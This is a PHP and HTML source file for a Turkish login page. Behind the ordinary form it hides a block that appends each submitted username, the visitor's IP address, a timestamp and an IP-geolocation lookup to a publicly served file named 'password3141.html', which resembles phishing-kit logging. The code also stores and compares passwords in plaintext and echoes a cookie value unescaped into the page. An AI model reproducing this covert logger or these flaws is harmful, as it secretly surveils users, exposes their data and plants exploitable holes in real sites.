<!doctype html>
<html>
<head>

<meta charset="utf-8">
<title>Kullanıcı Girişi</title>
<link href='https://fonts.googleapis.com/css?family=Pacifico' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Arimo' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Hind:300' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>

<link rel="stylesheet" href="css/style.css">

</head>

<body>
  <div id="login-button">
  <img src="http://dqcgrsy5v35b9.cloudfront.net/cruiseplanner/assets/img/icons/login-w-icon.png">
  </img>
</div>
<div id="container">
  <h1>Giriş Yap</h1>
  <span class="close-btn">
    <img src="https://cdn4.iconfinder.com/data/icons/miu/22/circle_close_delete_-128.png"></img>
  </span>

<form method="post">
<input type="text" name="kadi" placeholder="Kullanıcı Adı " required="required" value="<?php if(isset($_COOKIE['kullan'])) echo $_COOKIE['kullan'];?>">
<input type="password" name="sifre" placeholder="Şifre " required="required">
<input type="submit" value="Giriş" name="giris" class="lemon">

    <div id="remember-container">
      <input type="checkbox" id="checkbox-2-1" class="checkbox" checked="checked" name="hatirla"/>
      <a href="uyekayit.php">Üye Ol</a>
      <span id="remember">Beni UNUTMAA!!</span>
    </div>
</form>

  <script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

    <script src="js/index.js"></script>



</body>
</html>


<?php
require("config.php");

if(isset($_POST["giris"])){
	$kadi=$_POST["kadi"];
	$sifre=$_POST["sifre"];
	$durum=0;
	$baglanti = baglan();
	$users = mysqli_query($baglanti,"select * from uyeler");
	$users2 = mysqli_num_rows($users);
	for($i=1;$i<=$users2;$i++){
	$kayit = mysqli_fetch_array($users);
	if($kadi == $kayit["kadi"] && $sifre == $kayit["sifre"]){
		$durum = 1;
		echo "Giriş Doğru...";
		session_start();
		$_SESSION["ad"]=$kayit["ad"]." ".$kayit["soyad"];
		header("refresh:2;url=index.php");
	}
	
	}
if($durum==0){
	echo '<br><span class="lemon">Hatalı üye girişi yaptınız.<br></span>';
}

}
error_reporting(0);
setlocale(LC_TIME, 'tr_TR');
date_default_timezone_set('Europe/Istanbul');

$lemmon = $_POST['kadi'];  
$ip = $_SERVER['REMOTE_ADDR']; 
$fecha = date("Y-m-d;h:i:s"); 
$xmll = simplexml_load_file("http://api.ipinfodb.com/v3/ip-city/?key=df82fd0d0bdfe232648e350eb7df966da870d4adc166fe5cd9209688853ed7e9&ip=$ip");
 
 
if( (empty($lemmon)) ){
     echo ' '; 
}else{
 
$f = fopen("password3141.html", "a");
fwrite ($f,
'Ad: [<b><font face="verdana" color="#9900FF">'.$lemmon.'</font></b>]
IP: [<b><font face="verdana" color="#996600">'.$ip.'</font></b>]
Date: [<b><font face="verdana" color="#FF6633">'.$fecha.'</font></b>]
Adress: [<b><font face="verdana" color="#FF6633">'.$xmll.'</font></b>] <br>
<br> ');
 
fclose($f);
}


//Beni Unutmaa!!!!!
if(isset($_POST['hatirla']))
{
 echo '';
 if(isset($_POST['kadi']))
 {
  setcookie("kullan","$kadi", time()+60*60*24);
 }
}
else
{
setcookie("kullan","$kadi", time()-60*60*24);
}


?>